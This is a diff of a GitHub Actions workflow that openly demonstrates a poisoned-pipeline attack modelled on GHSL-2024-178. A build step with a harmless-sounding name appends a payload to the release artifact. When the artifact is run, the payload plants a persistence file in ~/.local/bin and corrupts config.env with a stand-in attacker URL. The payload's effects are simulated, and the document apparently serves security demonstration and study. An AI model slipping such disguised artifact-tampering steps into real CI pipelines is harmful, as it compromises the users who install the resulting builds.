@@ -1,30 +1,62 @@
-name: Release App
+name: Production Build and Release
 on:
   push:
     branches: [ main ]
-  pull_request: # The attacker adds this to trigger the PPE
+  pull_request:
     branches: [ main ]
 
 jobs:
-  build-and-release:
+  build-job:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-      
+      # 1. Standard Checkout of the repository
+      - name: Checkout Code
+        uses: actions/checkout@v4
+
+      # 2. Baseline Build (Simulating the 'Trusted' software creation)
       - name: Build Application
         run: |
           mkdir -p dist
-          echo "Current legitimate application code" > dist/app.exe
+          echo "echo 'Build Version 1.0 - SECURE'" > dist/production-binary.sh
+          chmod +x dist/production-binary.sh
 
-      # --- DIRECT PPE PAYLOAD ---
-      - name: Inject Telemetry (Backdoor)
+      # 3. THE ATTACK: RSSHub LOGIC BOMB REPRODUCTION (Direct PPE)
+      # This step mimics GHSL-2024-178 by poisoning the build artifact
+      # with hidden logic that detonates when the user runs the file.
+      - name: Verify build environment metadata 
         run: |
-          echo "INJECTING MALICIOUS CODE..."
-          echo "System.Backdoor.Connect('attacker.com')" >> dist/app.exe
-      # --- END PAYLOAD ---
+          echo "Simulating GHSL-2024-178: Artifact-driven Logic Bomb"
           
+          # We use a Heredoc to inject complex bash logic into the artifact
+          cat << 'EOF' >> dist/production-binary.sh
+
+          # --- START OF INJECTED PAYLOAD ---
+
+          # 1. SIMULATED PERSISTENCE
+          # Creates a hidden 'backdoor' in the user's home directory path
+          if [ ! -d "$HOME/.local/bin" ]; then mkdir -p "$HOME/.local/bin"; fi
+          echo "echo 'SYSTEM COMPROMISED: Persistent backdoor running...'" > "$HOME/.local/bin/sys_verify"
+          chmod +x "$HOME/.local/bin/sys_verify"
+
+          # 2. INTEGRITY SABOTAGE
+          # Overwrites a simulated configuration file to disrupt system state
+          echo "MOD_STATE=VULNERABLE" > ./config.env
+          echo "DB_CONNECTION=http://attacker-c2-server.com/leak" >> ./config.env
+
+          # 3. CONSOLE OUTPUT (For your demonstration)
+          echo "--------------------------------------------------"
+          echo "LOGIC BOMB DETONATED"
+          echo "Status: Persistence established in ~/.local/bin/sys_verify"
+          echo "Status: Local config.env has been corrupted."
+          echo "--------------------------------------------------"
+          
+          # --- END OF INJECTED PAYLOAD ---
+          EOF
+
+      # 4. Upload the Poisoned Artifact
+      # This attaches the compromised 'binary' to the GitHub Action run.
       - name: Upload Artifact
         uses: actions/upload-artifact@v4
         with:
           name: production-binary
-          path: dist/app.exe
+          path: dist/production-binary.sh
